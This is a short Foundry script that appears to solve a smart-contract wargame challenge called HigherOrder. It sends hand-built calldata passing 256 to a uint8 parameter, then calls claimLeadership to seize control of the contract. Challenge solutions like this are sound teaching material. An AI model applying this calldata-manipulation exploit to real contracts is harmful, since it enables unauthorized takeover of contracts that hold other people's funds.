// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.12;

import {Script, console} from "forge-std/Script.sol";
import "../src/HigherOrder.sol";

contract HigherOrderScript is Script {
    HigherOrder public target;
    function setUp() public {
        target = HigherOrder(0x88dc339C32DCeA9e6DA638C63DFa1080865cb2f6);
    }

    // 0x211c85ab
    function run() public {
        vm.startBroadcast();

        (bool success, ) = address(target).call(
            abi.encodePacked(
                abi.encodeWithSignature("registerTreasury(uint8)"), 
                abi.encode(256)
                )
            );
        require(success, "revert");

        target.claimLeadership();

        vm.stopBroadcast();
    }

}
